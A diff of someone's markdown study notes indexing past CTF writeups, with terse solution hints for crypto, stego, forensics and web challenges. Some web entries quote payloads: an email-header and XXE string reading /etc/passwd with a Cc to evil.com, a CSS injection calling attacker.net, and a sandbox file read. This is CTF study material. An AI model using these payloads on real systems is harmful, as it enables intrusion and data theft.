@@ -1,219 +1,5 @@
 # NOTES ON PAST CTFS WRITEUPS
 
-# videos
-https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w/videos
-
-# other places to check
-https://github.com/abpolym/route2ctf/ # keywords <=> writeup mappings
-https://github.com/apsdehal/awesome-ctf
-https://github.com/zardus/ctf-tools http://www.kitploit.com/2016/03/ctf-tools-some-setup-scripts-for.html
-
-# still online
-https://backdoor.sdslabs.co/challenges
-
-# all past writeups
-csaw: https://github.com/isislab/ (was https://ctf.isis.poly.edu/writeups/)
-ndh and volgactf: http://sigint.ru/writeups/
-
-# gone over (skipped pwn & reverse tasks) {{{
-* pico-ctf-2013
-* boston-key-party-2014
-* codegate-preliminary-2014
-* confidence-ds-ctf-teaser-2014
-* d-ctf-2014
-* asis-ctf-quals-2014
-* 9447-ctf-2014
-* 31c3-ctf-2014
-* defcon-ctf-qualifier-2014
-* ectf-2014
-* ghost-in-the-shellcode-2014
-* hack-lu-ctf-2014
-* hack-you-2014
-* hitcon-ctf-2014
-* ncn-ctf-2014
-* ncn-ctf-quals-2014
-* olympic-ctf-2014
-* phdays-2014-{quals,finals}
-* pwnium-ctf-2014
-* qiwi-ctf-2014
-* ructf-2014-quals
-* seccon-ctf-2014
-* secuinside-ctf-prequal-2014
-* 0ctf-2015
-* 32c3-ctf-2015 (itd pas compris)
-* 9447-ctf-2015 (ffmpeg 0day https://news.ycombinator.com/item?id=10893301 http://seclists.org/oss-sec/2016/q1/91)
-* asis-finals-ctf-2015
-* asis-quals-ctf-2015
-* backdoor-ctf-2015 javascript and clojure sandbox escapes
-* bctf-2015
-* boston-key-party-2015
-* breakin-ctf-2015
-* bsides-vancouver-ctf-2015
-* camp-ctf-2015
-* codegate-ctf-2015
-* confidence-ctf-teaser-2015
-* csaw-ctf-2015
-* csaw-finals-ctf-2015
-* cyber-security-challenge-2015
-* dctf-2015
-* defcon-quals-2015 todo
-* easy-ctf-2015 do the exploits
-* ekoparty-ctf-2015
-* ekoparty-pre-ctf-2015
-* ghost-in-the-shellcode-2015
-* hack-dat-kiwi-ctf-2015
-* hack-lu-ctf-2015
-* hackcon-2015
-* hackover-ctf-2015
-* haxdump-ctf-2015
-* hitcon-ctf-quals-2015
-* icectf-2015
-* insomnihack-2015 no writeups but sources at https://github.com/Insomnihack/Insomnihack-2015
-* mma-ctf-2015
-* nuit-du-hack-ctf-quals-2015
-* nullcom-hackim-2015
-* opentoall-ctf-2015
-* plaidctf-2015
-* polictf-2015
-* pragyan-ctf-2015
-* rctf-quals-2015 no writeups
-* ructfe-ad-2015 no writeups
-* sctf-2015
-* school-ctf-2015 no eng writeups
-* school-ctf-winter-2015
-* seccon-quals-ctf-2015
-* securinets-ctf-2015 many missing writeups
-* stem-ctf-2015
-* th3jackers-ctf-2015/
-* thailand-ctf-2015 no writeups
-* trend-micro-ctf-2015
-* volgactf-quals-2015
-* 0ctf-2016
-* alictf-2016
-* angstromctf-2016
-* asis-ctf-2016
-* asis-ctf-quals-2016
-* backdoor-ctf-2016
-* bctf-2016
-* bioterra-ctf-2016
-* blaze-ctf-2016
-* boston-key-party-2016
-* breakin-ctf-2016
-* codegate-ctf-2016
-* csaw-ctf-2016-quals
-* ctfx-2016
-* cyber-security-challenge-belgium-2016-qualifiers
-* def-con-ctf-qualifiers-2016 skipped
-* defcamp-2016
-* ectf-2016
-* ekoparty-ctf-2016
-* google-ctf-2016
-* h4ckit-ctf-2016
-* hack-the-vote-ctf-2016
-* hack.lu-ctf-2016
-* hackover-ctf-2016
-* hitb-ctf-amsterdam-2016
-* hitcon-ctf-quals-2016
-* icectf-2016
-* insomnihack-ctf-2016
-* insomnihack-teaser-2016
-* mma-ctf-2nd-2016
-* nuitduhack-quals-2016
-* nullcon-hackim-2016
-* open-ctf-2016
-* pentest-cyprus-2
-* plaidctf-2016
-* pwn2win-ctf-2016
-* sctf-2016-q1
-* seccon-ctf-quals-2016
-* secuinside-ctf-quals-2016
-* securinets-ctf-quals-2016
-* security-fest-2016
-* sharif-ctf-2016
-* ssctf-2016
-* su-ctf-2016
-* teaser-confidence-ctf-2016
-* tjctf-2016
-* tu-ctf-2016
-* tum-ctf-2016
-* insomnihack-teaser-2017
-* breakin-ctf-2017
-* alexctf-2017
-* bitsctf-2017
-* nullcon-hackim-2017
-* bsides-sanfransisco-ctf-2017
-* boston-key-party-2017
-* 0ctf-2017
-* volga-ctf-quals-2017
-* insomnihack-ctf-2017
-* pico-ctf-2017
-* nuitduhack-quals-2017
-* asis-ctf-quals-2017
-* plaidctf-2017
-* uiuctf-2017
-* rctf-2017
-* sctf-2017
-* google-ctf-2017
-* secuinside-ctf-quals-2017
-* polictf-2017
-* meepwn-ctf-2017
-* ctfzone-2017
-
-# }}}
-
-# writeups / to read {{{
-https://github.com/VulnHub/ctf-writeups
-https://github.com/pwning/public-writeup // see writeups by Robert Xiao (@nneonneo) the PPP crpyto guy?
-https://github.com/smokeleeteveryday/CTF_WRITEUPS
-https://github.com/ispoleet/ctf-writeups bo1lers
-https://github.com/73696e65/ctf-notes
-
-* blogs
-https://w00tsec.blogspot.com.au/ https://github.com/bmaia/
-CaptureTheSwag https://ctf.rip/ https://github.com/sourcekris/ctf-solutions
-InternetWache https://0day.work/
-Tasteless http://tasteless.eu/
-LC!BC http://mslc.ctf.su/ More Smoked Leet Chicken (leetmore.ctf.su + smokedchicken.org) (now merged with BalalaikaCr3w as LC!BC)
-BalalaikaCr3w https://ctfcrew.org/
-Fourchette Bombe https://github.com/JulesDT http://0xecute.com/
-khack40 http://khack40.info/
-Raccoons https://github.com/raccoons-team/ctf/
-Eat Sleep Pwn Repeat https://kitctf.de/
-kt (ex SpamAndHex! captain) https://kt.pe/blog/
-
-* crypto
-https://grocid.net https://github.com/grocid/CTF
-https://grocid.net/2016/08/11/solving-problems-with-lattice-reduction/ explains lcg, crt, lattice reduction
-https://github.com/SideChannelMarvels/Deadpool (crypto)
-
-* exploit
-http://blog.rewolf.pl/blog/?p=1563
-
-* flare-on 2015
-http://acidshout.github.io/
-
-* pillow - secuinside-ctf-prequal-2014
-https://github.com/ctfs/write-ups-2014/tree/master/secuinside-ctf-prequal-2014/pillow
-
-* harry-potter - plaid-ctf-2014
-http://eindbazen.net/2014/04/plaidctf-2014-harry_potter-300/
-
-* kappa - plaid-ctf-2014
-http://eindbazen.net/2014/04/plaidctf-2014-kappa-275/
-https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwn-275-kappa-type-confusion-vuln
-
-* graphs - plaid-ctf-2014
-https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/graphs
-
-* wheeeee - plaid-ctf-2014
-slide attack
-https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/wheeeee
-
-* guess - hitcon-ctf-quals-2015
-https://github.com/pwning/public-writeup/blob/master/hitcon2015/crypto300-guess/writeup.md
-
-# }}}
-
 # exploit {{{
 * python sandbox/jail escapes
 http://gynvael.coldwind.pl/n/python_sandbox_escape
@@ -760,7 +546,7 @@ part2: md5 collisions, submit 8 files having the same MD5. Use fastcol https://m
 https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_forge
 
 * baby - backdoor-ctf-2016
-Bleicherbacher e=3 RSA Attack against signature verification
+Bleicherbacher e=3 RSA attack against signature verification
 https://grocid.net/2016/06/05/backdoorctf16-baby/
 
 * crc - backdoor-ctf-2016
@@ -993,7 +779,7 @@ we have ciphertext + key, use c++ prog to bruteforce SBox and SInvBox to recover
 https://github.com/JulesDT/ctfWriteUps/tree/master/Hackit%20Quals%202016/Handmade%20encryption%20standard%20-%20Crypto%20-%20250%20pts
 
 * cornelius - hack.lu-ctf-2016
-zlib compression before encryption allows to leak flag
+zlib compression before encryption allows to leak flag (CRIME)
 https://ctf.rip/hack-lu-ctf-2016-cornelius1-crypto-challenge/
 
 * redacted - hack.lu-ctf-2016
@@ -1021,7 +807,7 @@ https://github.com/grocid/CTF/tree/master/Hackover/2016#guessr
 server decrypts user input using AES CBC with key=IV ans the flag is the key
 http://ctfsolutions.blogspot.com.au/2016/10/hitcon-ctf-2016-lets-decrypt.html and rizzoma
 
-* twin primes - mmactf-2016
+* twin primes - mma-ctf-2016
 two rsa keys with: n1 = pq and n2=(p+2)(q+2) => pq + 2p + 2q + 4
 n2 - n1 = 2p + 2q + 4 => let s = (n2 - n1 - 4)/2 = p + q
 q = (s - p)
@@ -1030,11 +816,19 @@ p^2 - sp + n1 = 0 => p = (s + gmpy2.isqrt(-s*-s-4*1*n1))/2
 or use from sympy: from sympy import *; from sympy.solvers import solve; p, q = solve([Eq(p*q, n1), Eq((p+2) * (q+2), n2)], [p, q])[0]
 https://github.com/TeamContagion/CTF-Write-Ups/tree/master/TokyoWesterns-2016/Twin%20Primes
 
-* esper - mmactf-2016
+* esper - mma-ctf-2016
 server can encrypt or decrypt user input
 recover N with pgcd(c1 - 2^65537, c2 - 3^65537) = N
 recover q with pgcd(N, (h1-h2)*q) = q
 https://0x90r00t.com/fr/2016/09/08/mma-ctf-2016-crypto-180-esper-write-up/
+
+* pinhole attack - mma-ctf-2016
+RSA decryption oracle leaking 2 consecutive bits in the middle
+http://mslc.ctf.su/wp/tokyo-westernsmma-ctf-2016-pinhole-attack-crypto-500/
+
+* backdoored crypto system - mma-ctf-2016
+recovering AES key from partial subkey leaks
+http://mslc.ctf.su/wp/tokyo-westernsmma-ctf-2016-backdoored-crypto-system-reversecrypto-400/
 
 * lsb oracle - sharif-ctf-2016
 oracle gives the least significant bit of the decryption of a ciphertext
@@ -1128,6 +922,45 @@ https://dowsll.github.io/writeups/polictf2017/splyt
 * mprsa - ctfzone-2017
 rsa wiener
 https://github.com/p4-team/ctf/tree/master/2017-07-15-ctfzone/mprsa
+
+* hack in the card - hitb-ctf-singapore-2017
+recover RSA private key from voltage variation of the resistor during the decrypt process using this smart card
+then factorize modulus N using recovered d
+https://tradahacking.vn/hitb-gsec-singapore-2017-ctf-write-ups-crypto-category-803d6c770103
+
+* prime - hitb-ctf-singapore-2017
+calculate number of primes + number of squares of primes, less than 10^16
+https://rawsec.ml/en/HITB-2017-write-ups/#prime-mobile
+
+* chinese satellite - h4ckit-ctf-2017
+quantum key exchange
+https://github.com/p4-team/ctf/tree/master/2017-08-25-hackit/crypto200
+
+* 4 messages - h4ckit-ctf-2017
+break playfair cipher given 4 ciphertexts of a plaintext that starts with known string
+https://ctftime.org/task/4510
+
+* liar's trap - mma-ctf-2017
+flag divided into N=100 pieces Shamir secret sharing so i can be recovered given at least K=25 pieces but L=38 pieces
+have been corrupted so use Reed-Solomon error-correcting codes
+https://galhacktictrendsetters.wordpress.com/2017/09/05/tokyo-westerns-ctf-2017-liars-trap/
+
+* bad aes - sect-ctf-2017
+aes with custom sbox missing last 16 bytes (patch pyaes to try all permutations)
+https://pequalsnp-team.github.io/writeups/Bad-Aes
+
+* madlog - sect-ctf-2017
+discrete logarithm with e containing lots of zeros, solve with baby-step giant-step
+https://github.com/ymgve/ctf-writeups/tree/master/sect2017/crypto200-madlog
+
+* gracias - asis-ctf-2017
+Small Secret Exponent Attack against Multi-Prime RSA
+https://elliptic-shiho.github.io/ctf-writeups/#!ctf/2017/ASIS%20CTF%20Finals/cr287-Gracias/README.md using Boneh-Durfee
+https://gist.github.com/niklasb/84fb894c7658f29b21fd7b7e1704f799 using Wiener
+
+* extends me - backdoor-ctf-2017
+hash length extension with SLHA1 a variant of SHA1
+https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/backdoorctf-2017/web/extends-me-250
 
 # }}}
 
@@ -1328,6 +1161,10 @@ the alpha values are in the printable ascii range
 rearrange the pixel values by RGB value, using the key red<<8 + green<<4 + blue, produces brainfuck code
 use pybrainfuck to decode flag
 https://gist.github.com/Lense/a8e94e96f886cb773f646b8aaea806fc
+
+* ninth - mma-ctf-2016
+flag is in additional compressed data in each IDAT chunk
+https://codisec.com/tw-mma-2-2016-ninth/
 # }}}
 
 # forensics {{{
@@ -1465,6 +1302,14 @@ or like in ctfx-2016/iTrash find gesture.key and follow http://resources.infosec
 * secr3tmgr lock - insomnihack-ctf-2017
 crack android lockscreen password from /data/system/password.key and device_policies.xml
 http://arishitz.net/writeup-secr3tmgr-forensic-insomnihack-2017/
+
+* flying high - hitb-ctf-singapore-2017
+UBIFS
+https://nandynarwhals.org/hitbgsec2017-flyinghigh/
+
+* arrdeepee - hitb-ctf-singapore-2017
+decrypt RDP over SSL using pkcs12 transmitted over udp, and replay the RDP session
+https://nandynarwhals.org/hitbgsec2017-arrdeepee/
 
 # }}}
 
@@ -1920,7 +1765,7 @@ rizzoma
 enter websocket code in browser console to submit fake score
 https://github.com/ctfs/write-ups-2016/tree/master/cyber-security-challenge-belgium-2016-qualifiers/Web%20Security/Tap-dat-ass-part1
 
-* tsurai - mmactf-2016
+* tsurai - mma-ctf-2016
 upload __init__.py with
 x = __import__('subprocess'); x.check_output(...)
 https://blog.0daylabs.com/2016/09/05/code-execution-python-import-mmactf-300/
@@ -1940,6 +1785,10 @@ https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/web/Luc
 * ultimate design tool - whitehat-contest-11
 css injection
 https://github.com/ctfs/write-ups-2016/tree/master/whitehat-contest-11/web/ultimate-design-tool-100
+
+* web400 - sect-ctf-2016
+bypass csp by loading outdated angularjs from whitelisted cdn
+https://blog.0daylabs.com/2016/09/09/bypassing-csp/
 
 * artisinal shoutboxes - boston-key-party-2017
 chain 2 xss, first xss sets cookie with second xss payload to exfil admin page content
@@ -2025,6 +1874,10 @@ https://ctftime.org/writeup/6815
 GQL injection with rate limits
 https://github.com/p4-team/ctf/tree/master/2017-06-17-googlectf/a7_gee_cue_elle
 
+* geokittiesv2 - google-ctf-2017
+xss with unicode U+212A kelvin sign to bypass filter
+https://drive.google.com/drive/folders/0BwMPuUHZOj0nS1MwTVF1ZW9SdEE
+
 * mygf - secuinside-ctf-quals-2017
 use information_schema.processlist in sqli to leak secret key in first query (race)
 https://ctftime.org/writeup/6901
@@ -2041,6 +1894,51 @@ https://devcraft.io/posts/2017/07/10/pyzzeria-polictf-2017.html
 email header injection + xxe
 subject=-->%26xxe;test123%0d%0aCc:+a@evil.com&encoding=UTF-8"%3f><!DOCTYPE+foo+[<!ELEMENT+foo+ANY+><!ENTITY+xxe+SYSTEM+"file%3a///etc/passwd"+>]><!--
 https://github.com/chamli/Write_Up_Ctf/blob/master/CTFZone%202017/Mr.Future%20President%20Blog.md
+
+* blog - hitb-ctf-singapore-2017
+GraphQL injection / SQLite
+https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/
+
+* h4ck3rm1nd - h4ckit-ctf-2017
+chars < and > filtered out, use bbcode [color="test;} * {background: url('http://attacker.net/test')"]a[/color] to do css injection
+https://rioru.github.io/ctf/web/2017/08/27/ctf-writeup-hackit-2017-web200.html
+
+* b3tters0ci4ln3twork - h4ckit-ctf-2017
+wget < 1.18 vuln to extension check via race condition CVE-2016-7098
+https://ctftime.org/task/4520
+
+* clock - mma-ctf-2017
+use history.pushState() to set off xss via the Referer: header
+use WebRTC to detect local IP to bypass local IP restriction
+https://blog.tyage.net/?p=1043
+
+* super secure storage - mma-ctf-2017
+server doesn't check JSON parameter is a string so we can pass an array to guess length and value of the encryption key
+http://corb3nik.github.io/blog/tokyo-westerns-2017/super-secure-storage
+
+* funtimejs 2 - csaw-ctf-2017-quals
+web server runs user code in javascript vm, use fs module to read flag file
+console.log(require('fs').readFileSync('flag.txt').toString());
+
+* not my cup of coffee - csaw-ctf-2017-quals
+send serialized Java Bean object with a parent set to the Flag bean
+https://blog.ankursundara.com/csaw-ctf-quals-2017-not-my-cup-of-coffee/
+
+* shia labeouf off - csaw-ctf-2017-quals
+django custom template filter tags and ssti
+https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/
+
+* silkroad - ekoparty-ctf-2017
+HTTPoxy + proxy.py mitm
+https://jbzteam.github.io/web/EkoPartyCTF2017-silkroad
+
+* my first app - ekoparty-ctf-2017
+/getflag -> 403 but /index.php same as /index.php/ suggests mod_rewrite regex rules, bypass with /index.php/getflag
+https://github.com/p4-team/ctf/tree/master/2017-09-17-ekoparty/my_first_app_web
+
+* dark market - sect-ctf-2017
+graphql
+https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket
 
 # }}}
 
@@ -2180,4 +2078,220 @@ https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/network/Sm
 * jareCaptcha - sharif-ctf-2016
 sudoku solver and captcha bypass (reuse same captcha cookie id)
 https://github.com/p4-team/ctf/blob/master/2016-12-16-sharifctf7/web_200_jareCaptcha/README.md
+# }}}
+
+# done (but skipped pwn & reverse tasks) {{{
+* pico-ctf-2013
+* boston-key-party-2014
+* codegate-preliminary-2014
+* confidence-ds-ctf-teaser-2014
+* d-ctf-2014
+* asis-ctf-quals-2014
+* 9447-ctf-2014
+* 31c3-ctf-2014
+* defcon-ctf-qualifier-2014
+* ectf-2014
+* ghost-in-the-shellcode-2014
+* hack-lu-ctf-2014
+* hack-you-2014
+* hitcon-ctf-2014
+* ncn-ctf-2014
+* ncn-ctf-quals-2014
+* olympic-ctf-2014
+* phdays-2014-{quals,finals}
+* pwnium-ctf-2014
+* qiwi-ctf-2014
+* ructf-2014-quals
+* seccon-ctf-2014
+* secuinside-ctf-prequal-2014
+* 0ctf-2015
+* 32c3-ctf-2015 (itd pas compris)
+* 9447-ctf-2015 (ffmpeg 0day https://news.ycombinator.com/item?id=10893301 http://seclists.org/oss-sec/2016/q1/91)
+* asis-finals-ctf-2015
+* asis-quals-ctf-2015
+* backdoor-ctf-2015 javascript and clojure sandbox escapes
+* bctf-2015
+* boston-key-party-2015
+* breakin-ctf-2015
+* bsides-vancouver-ctf-2015
+* camp-ctf-2015
+* codegate-ctf-2015
+* confidence-ctf-teaser-2015
+* csaw-ctf-2015
+* csaw-finals-ctf-2015
+* cyber-security-challenge-2015
+* dctf-2015
+* defcon-quals-2015 todo
+* easy-ctf-2015 do the exploits
+* ekoparty-ctf-2015
+* ekoparty-pre-ctf-2015
+* ghost-in-the-shellcode-2015
+* hack-dat-kiwi-ctf-2015
+* hack-lu-ctf-2015
+* hackcon-2015
+* hackover-ctf-2015
+* haxdump-ctf-2015
+* hitcon-ctf-quals-2015
+* icectf-2015
+* insomnihack-2015 no writeups but sources at https://github.com/Insomnihack/Insomnihack-2015
+* mma-ctf-2015
+* nuit-du-hack-ctf-quals-2015
+* nullcom-hackim-2015
+* opentoall-ctf-2015
+* plaidctf-2015
+* polictf-2015
+* pragyan-ctf-2015
+* rctf-quals-2015 no writeups
+* ructfe-ad-2015 no writeups
+* sctf-2015
+* school-ctf-2015 no eng writeups
+* school-ctf-winter-2015
+* seccon-quals-ctf-2015
+* securinets-ctf-2015 many missing writeups
+* stem-ctf-2015
+* th3jackers-ctf-2015/
+* thailand-ctf-2015 no writeups
+* trend-micro-ctf-2015
+* volgactf-quals-2015
+* 0ctf-2016
+* alictf-2016
+* angstromctf-2016
+* asis-ctf-2016
+* asis-ctf-quals-2016
+* backdoor-ctf-2016
+* bctf-2016
+* bioterra-ctf-2016
+* blaze-ctf-2016
+* boston-key-party-2016
+* breakin-ctf-2016
+* codegate-ctf-2016
+* csaw-ctf-2016-quals
+* ctfx-2016
+* cyber-security-challenge-belgium-2016-qualifiers
+* def-con-ctf-qualifiers-2016 skipped
+* defcamp-2016
+* ectf-2016
+* ekoparty-ctf-2016
+* google-ctf-2016
+* h4ckit-ctf-2016
+* hack-the-vote-ctf-2016
+* hack.lu-ctf-2016
+* hackover-ctf-2016
+* hitb-ctf-amsterdam-2016
+* hitcon-ctf-quals-2016
+* icectf-2016
+* insomnihack-ctf-2016
+* insomnihack-teaser-2016
+* mma-ctf-2nd-2016
+* nuitduhack-quals-2016
+* nullcon-hackim-2016
+* open-ctf-2016
+* pentest-cyprus-2
+* plaidctf-2016
+* pwn2win-ctf-2016
+* sctf-2016-q1
+* seccon-ctf-quals-2016
+* secuinside-ctf-quals-2016
+* securinets-ctf-quals-2016
+* security-fest-2016
+* sharif-ctf-2016
+* ssctf-2016
+* su-ctf-2016
+* teaser-confidence-ctf-2016
+* tjctf-2016
+* tu-ctf-2016
+* tum-ctf-2016
+* insomnihack-teaser-2017
+* breakin-ctf-2017
+* alexctf-2017
+* bitsctf-2017
+* nullcon-hackim-2017
+* bsides-sanfransisco-ctf-2017
+* boston-key-party-2017
+* 0ctf-2017
+* volga-ctf-quals-2017
+* insomnihack-ctf-2017
+* pico-ctf-2017
+* nuitduhack-quals-2017
+* asis-ctf-quals-2017
+* plaidctf-2017
+* uiuctf-2017
+* rctf-2017
+* sctf-2017
+* google-ctf-2017
+* secuinside-ctf-quals-2017
+* polictf-2017
+* meepwn-ctf-2017
+* ctfzone-2017
+* asis-ctf-2017
+* sect-ctf-2017
+* csaw-ctf-2017-quals
+* ekoparty-ctf-2017
+* backdoor-ctf-2017
+* defcamp-2017
+
+# }}}
+
+# to do {{{
+* moar
+https://github.com/abpolym/route2ctf/ # keywords <=> writeup mappings
+https://github.com/apsdehal/awesome-ctf
+https://github.com/zardus/ctf-tools http://www.kitploit.com/2016/03/ctf-tools-some-setup-scripts-for.html
+https://github.com/VulnHub/ctf-writeups
+https://github.com/pwning/public-writeup // see writeups by Robert Xiao (@nneonneo) the PPP crpyto guy?
+https://github.com/smokeleeteveryday/CTF_WRITEUPS
+https://github.com/ispoleet/ctf-writeups bo1lers
+https://github.com/73696e65/ctf-notes
+
+* still online
+https://backdoor.sdslabs.co/challenges
+
+* all past writeups
+csaw: https://github.com/isislab/ (was https://ctf.isis.poly.edu/writeups/)
+ndh and volgactf: http://sigint.ru/writeups/
+
+* blogs
+https://w00tsec.blogspot.com.au/ https://github.com/bmaia/
+CaptureTheSwag https://ctf.rip/ https://github.com/sourcekris/ctf-solutions
+InternetWache https://0day.work/
+Tasteless http://tasteless.eu/
+LC!BC http://mslc.ctf.su/ More Smoked Leet Chicken (leetmore.ctf.su + smokedchicken.org) (now merged with BalalaikaCr3w as LC!BC)
+BalalaikaCr3w https://ctfcrew.org/
+Fourchette Bombe https://github.com/JulesDT http://0xecute.com/
+khack40 http://khack40.info/
+Raccoons https://github.com/raccoons-team/ctf/
+Eat Sleep Pwn Repeat https://kitctf.de/
+kt (ex SpamAndHex! captain) https://kt.pe/blog/
+
+* crypto
+https://grocid.net https://github.com/grocid/CTF
+https://grocid.net/2016/08/11/solving-problems-with-lattice-reduction/ explains lcg, crt, lattice reduction
+https://github.com/SideChannelMarvels/Deadpool (crypto)
+
+* exploit
+http://blog.rewolf.pl/blog/?p=1563
+
+* flare-on 2015
+http://acidshout.github.io/
+
+* pillow - secuinside-ctf-prequal-2014
+https://github.com/ctfs/write-ups-2014/tree/master/secuinside-ctf-prequal-2014/pillow
+
+* harry-potter - plaid-ctf-2014
+http://eindbazen.net/2014/04/plaidctf-2014-harry_potter-300/
+
+* kappa - plaid-ctf-2014
+http://eindbazen.net/2014/04/plaidctf-2014-kappa-275/
+https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwn-275-kappa-type-confusion-vuln
+
+* graphs - plaid-ctf-2014
+https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/graphs
+
+* wheeeee - plaid-ctf-2014
+slide attack
+https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/wheeeee
+
+* guess - hitcon-ctf-quals-2015
+https://github.com/pwning/public-writeup/blob/master/hitcon2015/crypto300-guess/writeup.md
+
 # }}}
